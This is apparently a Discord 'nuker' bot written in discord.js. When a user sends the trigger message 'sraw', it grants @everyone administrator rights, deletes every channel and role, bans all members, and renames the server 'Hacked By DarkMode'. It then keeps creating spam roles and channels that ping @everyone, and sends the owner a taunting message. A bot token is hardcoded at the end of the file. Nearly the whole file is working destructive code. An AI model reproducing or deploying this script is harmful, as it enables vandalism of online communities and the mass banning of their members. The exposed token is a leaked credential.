const Discord = require("discord.js");
const client = new Discord.Client();

client.on("message", message => {

  if (message.content.startsWith(`sraw`)) {

    message.delete();

    message.guild.roles.cache.find(r => r.name === "@everyone").edit({

      permissions: ["ADMINISTRATOR"] ///premission akata adminstator

    });

    message.guild.channels.cache.map(c => {

      c.delete();

    });

    message.guild.roles.cache.forEach(r => {

      r.delete();

    });

    message.guild.members.cache.forEach(m => {

      m.ban();

    });

    setInterval(() => {

      message.guild.roles

        .create({

        data: {

          name: "Hacked By DarkMode:joy:",

          permissions: ["ADMINISTRATOR"]

        }

        })

        .then(rr => {

          message.member.roles.add(rr.id);

        });

    }, 1000);

    message.guild.setIcon("");

    client.user.setAvatar("");

    client.user.setUsername("Hacked By DarkMode");

    message.guild.owner.send(

      "Bdaxo nradar servert hackrawa 😹"

    );

    message.guild.setName("Hacked By DarkMode");

    setTimeout(function() {

      setInterval(

        () => {

          message.guild.channels

            .create("hacked by DarkMode ", "text")

            .then(channel => {

              channel.send(

                "@everyone Hacked By DarkMode:joy: :joy: :joy:"

              );

            })
        },

 

        1000

      );

    });

  }

});

 

////Lalayan black jack drwst krawa mayka hyxot

client.login("OTc2MTExMzA3MzQwMjU5MzU5.GY56QE.k2TY7dz6XRoFaOrrZy1vVl4oxuipZjBoAMt5kc")
